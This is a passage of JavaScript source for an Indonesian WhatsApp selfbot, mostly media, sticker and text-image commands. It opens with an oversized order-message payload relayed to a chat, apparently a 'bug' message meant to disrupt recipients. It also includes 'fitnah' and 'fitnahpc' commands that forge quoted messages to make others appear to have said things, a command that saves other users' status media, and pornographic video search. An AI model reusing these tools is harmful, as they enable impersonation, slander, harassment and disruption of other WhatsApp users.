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",
"itemCount": 2021,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "LOL",
"message":"Hallo Kak",
"sellerJid": "6288224859350@s.whatsapp.net",
"token": "AR7i5IXXiMA6NjT0DxcwdcKxhXCy1rOrvlNJzqXPMr8PCg==",
"totalAmount1000": "99999999999999999999",
"totalCurrencyCode": "IDR",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:imeu, contextInfo:{}}) 

KonX.relayWAMessage(res)
break
case 'xs':
if (!c) return reply('Nyari Apa?')
pepex = await fetchJson(`https://bx-hunter.herokuapp.com/api/xvideosearch?query=${c}&apikey=${HunterApi}`)
reply(mess.wait)
pepex = pepex.result
ini_txt = ""
for (var x of pepex) {
ini_txt += `Title : ${x.title}\n`
ini_txt += `Info : ${x.info}\n`
ini_txt += `Link : ${x.link}\n\n\n`
}
anu = `${ini_txt}───────────────\n\n┌ ◪ *DOWNLOAD*
└ ${prefix}xvideo [link xvid] = Video`
KonX.sendMessage(from, anu, text, {quoted: mek})
break
case 'xvideo':
case 'xv':
if (!c) return reply('Linknya?')
x = await fetchJson(`https://bx-hunter.herokuapp.com/api/xvideodetail?url=${c}&apikey=${HunterApi}`)
reply(mess.wait)
vid = await getBuffer(x.result.files.low)
KonX.sendMessage(from, vid, video, {quoted: mek})
break
case 'listnulis':
  reply(`Example ${prefix}nulis tes
  🌹 ${prefix}nulis rival
  🌹 ${prefix}foliokanan rival
  🌹 ${prefix}foliokiri rival
  🌹 ${prefix}nuliskanan rival
  🌹 ${prefix}nuliskiri rival`)
  break
case 'foliokiri':
if (!c) return reply('Textnya mana gan?')
reply(mess.wait)
kon = await getBuffer(`https://hardianto-chan.herokuapp.com/api/foliokiri?text=${c}&apikey=${hardi}`)
buttons = [{buttonId: `${prefix}listnulis`,buttonText:{displayText: `List Nulis🔖`},type:1}]
              imageMsg = (await KonX.prepareMessageMedia(kon, "imageMessage", { thumbnail: kon, })).imageMessage
              buttonsMessage = {footerText:'𝘊𝘳𝘦𝘢𝘵𝘦𝘥 𝘉𝘺 © Naufal シ︎', imageMessage: imageMsg,
              contentText:`jangan lupa subscribe Yt Naufal tutor ☹︎`,buttons,headerType:4}
              prep = await KonX.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              KonX.relayWAMessage(prep)
break
case 'nsfw':
	        if (!isGroup) return reply(mess.only.group)
			if (!isOwner && !isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return reply(`untuk mengaktifkan ketik : ${prefix}nsfw 1`)
					if (Number(args[0]) === 1) {
						if (isNsfw) return reply('Sudah Aktif Kak')
						nsfww.push(from)
						fs.writeFileSync('./database/nsfww.json', JSON.stringify(nsfww))
						reply('Sukses mengaktifkan fitur nsfw')
						KonX.sendMessage(from, `Bebas Nyari Hentai 🗿`, text)
					} else if (Number(args[0]) === 0) {
						if (!isNsfw) return reply('Sudah Mati Kak')
						var ini = nsfww.indexOf(from)
						nsfww.splice(ini, 1)
						fs.writeFileSync('./database/nsfww.json', JSON.stringify(nsfww))
						reply('Sukses menonaktifkan fitur nsfw')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk mematikan')
					}
					break

          case 'maker2d2': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall gans`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker2?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					KonX.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./KonX.jpg')})
					break
		case 'maker2d3': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					KonX.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./KonX.jpg')})
					break
		case 'maker2d4': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker4?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					KonX.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./KonX.jpg')})
					break
			case 'maker3d': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = body.slice(8)
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					KonX.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./KonX.jpg')})
					break
			case 'maker3d2': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no2?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					KonX.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./KonX.jpg')})
					break
			case 'maker3d3': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no3?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					KonX.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./KonX.jpg')})
					break
			case 'maker3d4': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no4?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					KonX.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./KonX.jpg')})
					break
			case 'transformer': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker/special/transformer?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					KonX.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./KonX.jpg')})
					break
			case 'googletxt2':
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} tsukasa|chan|kawai`)
					makell = args.join(" ")
					ll1 = makell.split("|")[0];
					ll2 = makell.split("|")[1];
					ll3 = makell.split("|")[0];
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker?text=${ll1}&text2=${ll2}&text3=${ll3}&theme=google-suggestion&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					KonX.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./KonX.jpg')})
					break
			case 'battlefield': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall|Gans`)
					makell = args.join(" ")
					ll1 = makell.split("|")[0];
					ll2 = makell.split("|")[1];
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/game?text=${ll1}&text2=${ll2}&theme=battlefield&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					KonX.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./KonX.jpg')})
					break
			case 'coffeecup': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/senja?text=${makell}&theme=coffee-cup&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					KonX.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./KonX.jpg')})
					break
			case 'coffeecup2': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/senja?text=${makell}&theme=coffee-cup2&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					KonX.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./KonX.jpg')})
					break
			case 'neon': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/metallic?text=${makell}&theme=neon&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					KonX.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./KonX.jpg')})
					break
              case 'glow': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/metallic?text=${makell}&theme=glow&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					KonX.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./KonX.jpg')})
					break
			case 'summer': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/alam?text=${makell}&theme=summer&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					KonX.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./KonX.jpg')})
					break
			case 'flower': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/alam?text=${makell}&theme=flower&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					KonX.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./KonX.jpg')})
					break
			case 'burn': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/random?text=${makell}&theme=text-burn&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					KonX.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./KonX.jpg')})
					break
			case 'quote': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/random?text=${makell}&theme=art-quote&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `Thx Dah Pake`},type:1}]
              imageMsg = (await KonX.prepareMessageMedia(buffer1, "imageMessage", { thumbnail: buffer1, })).imageMessage
              buttonsMessage = {footerText:'𝘊𝘳𝘦𝘢𝘵𝘦𝘥 𝘉𝘺 © Naufal シ︎', imageMessage: imageMsg,
              contentText:`jangan lupa subscribe Yt Naufal tutor ☹︎`,buttons,headerType:4}
              prep = await KonX.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              KonX.relayWAMessage(prep)
					break
			case 'wooden': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/roses?text=${makell}&theme=wooden-boarch&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					KonX.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./KonX.jpg')})
					break
			case 'golden': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/roses?text=${makell}&theme=golden&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					KonX.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./KonX.jpg')})
					break
case 'detikvn':
encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediam = await KonX.downloadAndSaveMediaMessage(encmediam)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(mediam)
						KonX.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:fvn})
						fs.unlinkSync(mediam)
				break
				case "fb":
        if (!isRegistered) return reply(mess.ban)
        if (!q) return reply("Linknya?");
        if (!isUrl(args[0]) && !args[0].includes("facebook.com"))
          return reply(mess.Iv);
        reply(mess.wait);
        te = args.join(" ");
        hx.fbdown(`${te}`).then((G) => {
          ten = `${G.HD}`;
          sendMediaURL(from, ten, `*Link video_normal* : ${G.Normal_video}`);
        });
        break;
				case 'detikvideo':
				encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					median = await KonX.downloadAndSaveMediaMessage(encmedian)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(median)
						KonX.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: fvid})
						fs.unlinkSync(median)
				break
      case "colongsw": //arif
        if (!mek.key.fromMe) return;
        if ((isMedia && !mek.message.videoMessage) || isQuotedImage) {
          ger = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await KonX.downloadAndSaveMediaMessage(ger);
          KonX.sendMessage(sender, fs.readFileSync(owgi), "imageMessage", {
            caption: q,
          });
          reply("Sukses");
          fs.unlinkSync(owgi);
        } else if ((isMedia && !mek.message.videoMessage) || isQuotedVideo) {
          ger = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await KonX.downloadAndSaveMediaMessage(ger);
          KonX.sendMessage(sender, fs.readFileSync(owgi), "videoMessage", {
            caption: q,
          });
          reply("Sukses");
          fs.unlinkSync(owgi);
        } else {
          reply("Reply sw foto / video yg mau dicolong");
        }
        break    
      case "lirik":
        if (!q) return reply("lagu apa?");
        let song = await hx.lirik(q);
        sendMediaURL(from, song.thumb, song.lirik);
        break;
      case "otaku":
        if (!q) return reply("judul animenya?");
        let anime = await hx.otakudesu(q);
        rem = `*Judul* : ${anime.judul}
*Jepang* : ${anime.jepang}
*Rating* : ${anime.rate}
*Produser* : ${anime.produser}
*Status* : ${anime.status}
*Episode* : ${anime.episode}
*Durasi* : ${anime.durasi}
*Rilis* : ${anime.rilis}
*Studio* : ${anime.studio}
*Genre* : ${anime.genre}\n
*Sinopsis* :
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`;
        ram = await getBuffer(anime.img);
        KonX.sendMessage(from, ram, image, { quoted: mek, caption: rem });
        break;
      case "komiku":
        if (!q) return reply(`judulnya?\n${prefix}komiku mao gakuin`);
        let komik = await hx.komiku(q);
        result = `*Title* : ${komik.title}\n
*Title Indo* : ${komik.indo}\n
*Update* : ${komik.update}\n
*Desc* : ${komik.desc}\n
*Chapter Awal* : ${komik.chapter_awal}
*Chapter Akhir* : ${komik.chapter_akhir}`;
        sendMediaURL(from, komik.image, result);
        break;
      case "chara":
        if (!q) return reply(`gambar apa?\n${prefix}chara KonX`);
        let im = await hx.chara(q);
        let acak = im[Math.floor(Math.random() * im.length)];
        let li = await getBuffer(acak);
        await KonX.sendMessage(from, li, image, { quoted: mek });
        break;
      case 'pinterest':
            if(!q) return reply('gambar apa?')
            let pin = await hx.pinterest(q)
            let ac = pin[Math.floor(Math.random() * pin.length)]
            let di = await getBuffer(ac)
            await KonX.sendMessage(from,di,image,{quoted: mek})                        
                break
      case "playstore":
        if (!q) return reply("lu nyari apa?");
        let play = await hx.playstore(q);
        let store = "❉─────────────────────❉\n";
        for (let i of play) {
          store += `\n*「 _PLAY STORE_ 」*\n
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Link Dev* : ${i.link_dev}\n❉─────────────────────❉`;
        }
        reply(store);
        break;
      case "on":
        if (!mek.key.fromMe) return;
        offline = false;
        fakestatus(" ```ANDA TELAH ONLINE``` ");
        break;
      case "status":
        fakestatus(
          `*STATUS*\n${offline ? "> OFFLINE" : "> ONLINE"}\n${
            banChats ? "> SELF-MODE" : "> PUBLIC-MODE"
          }\n${prefixStatus ? "> MULTI-PREFIX" : "> NO-PREFIX"}`
        );
        break;
      case "off":
        if (!mek.key.fromMe) return;
        offline = true;
        waktu = Date.now();
        anuu = q ? q : "-";
        alasan = anuu;
        fakestatus(" ```ANDA TELAH OFFLINE``` ");
        break;
      case "get":
        if (!q) return reply("linknya?");
        fetch(`${args[0]}`)
          .then((res) => res.text())
          .then((bu) => {
            fakestatus(bu);
          });
        break;
      case "kontag":
        if (!mek.key.fromMe) return reply("Khusus Owner 🗿");
        pe = args.join("");
        entah = pe.split("|")[0];
        nah = pe.split("|")[1];
        if (isNaN(entah)) return reply("Invalid phone number");
        members_ids = [];
        for (let mem of groupMembers) {
          members_ids.push(mem.jid);
        }
        vcard =
          "BEGIN:VCARD\n" +
          "VERSION:3.0\n" +
          `FN:${nah}\n` +
          `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum(
            "+" + entah
          ).getNumber("internasional")}\n` +
          "END:VCARD".trim();
        KonX.sendMessage(
          from,
          { displayName: `${nah}`, vcard: vcard },
          contact,
          { contextInfo: { mentionedJid: members_ids } }
        );
        break;
      case "sticktag":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          encmedia = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await KonX.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await KonX.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          KonX.sendMessage(from, ini_buffer, sticker, options);
          fs.unlinkSync(file);
        } else {
          reply(`*Reply sticker yang sudah dikirim*`);
        }
        break;
      case "totag":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          encmedia = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await KonX.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await KonX.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          KonX.sendMessage(from, ini_buffer, sticker, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await KonX.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await KonX.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          KonX.sendMessage(from, ini_buffer, image, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedAudio) &&
          args.length == 0
        ) {
          encmedia = isQuotedAudio
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await KonX.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await KonX.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "audio/mp4",
            ptt: true,
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          KonX.sendMessage(from, ini_buffer, audio, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedVideo) &&
          args.length == 0
        ) {
          encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await KonX.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await KonX.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "video/mp4",
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          KonX.sendMessage(from, ini_buffer, video, options);
          fs.unlinkSync(file);
        } else {
          reply(
            `reply gambar/sticker/audio/video dengan caption ${prefix}totag`
          );
        }
        break;
      case "fitnah":
        if (args.length < 1)
          return reply(
            `Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`
          );
        var gh = args.join("");
        mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid;
        var replace = gh.split("|")[0];
        var target = gh.split("|")[1];
        var bot = gh.split("|")[2];
        KonX.sendMessage(from, `${bot}`, text, {
          quoted: {
            key: {
              fromMe: false,
              participant: `${mentioned}`,
              ...(from ? { remoteJid: from } : {}),
            },
            message: { conversation: `${target}` },
          },
        });
        break;
      case "settarget":
        if (!q) return reply(`${prefix}settarget 628xxxxx`);
        targetpc = args[0];
        fakegroup(`Succes Mengganti target fitnahpc : ${targetpc}`);
        break;
      case "fitnahpc":
        if (!q) return reply(`${prefix}fitnahpc teks target|teks lu`);
        jids = `${targetpc}@s.whatsapp.net`; // nomer target
        var split = args.join(" ").replace(/@|\d/gi, "").split("|");
        var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0];
        var options = {
          contextInfo: {
            quotedMessage: { extendedTextMessage: { text: split[0] } },
          },
        };
        const responye = await KonX.sendMessage(
          jids,
          `${split[1]}`,
          MessageType.text,
          options
        );
        await KonX.deleteMessage(jids, {
          id: responye.messageID,
          remoteJid: jids,
          fromMe: true,
        });
        break;
        case 'tomp4':
					if (!isQuotedSticker) return reply('Reply stiker nya')
                                        reply(mess.wait)
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            owgi = await KonX.downloadAndSaveMediaMessage(ger)
            webp2mp4File(owgi).then(res=>{
            sendMediaURL(from,res.result)
            })
            }else {
            reply('Reply Stickernya!')
            }
            fs.unlinkSync(owgi)
            break
      case "tomp3":
        if (!isQuotedVideo) return fakegroup("Reply videonya!");
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await KonX.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(`ffmpeg -i ${media} ${ran}`, (err) => {
          fs.unlinkSync(media);
          if (err) return fakegroup(`Err: ${err}`);
          buffer453 = fs.readFileSync(ran);
          KonX.sendMessage(from, buffer453, audio, {
            mimetype: "audio/mp4",
            quoted: mek,
          });
          fs.unlinkSync(ran);
        });
        break;
      case "fast":
        if (!isQuotedVideo) return fakegroup("Reply videonya!");
        fakegroup(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await KonX.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".mp4");
        exec(
          `ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`,
          (err) => {
            fs.unlinkSync(media);
            if (err) return fakegroup(`Err: ${err}`);
            buffer453 = fs.readFileSync(ran);
            KonX.sendMessage(from, buffer453, video, {
              mimetype: "video/mp4",
              quoted: mek,
            });
            fs.unlinkSync(ran);
          }
        );
        break;
        case "truth":
  if (!isRegistered) return reply(mess.ban)
					// Fix Case By Yogi/Hans⛔
                 
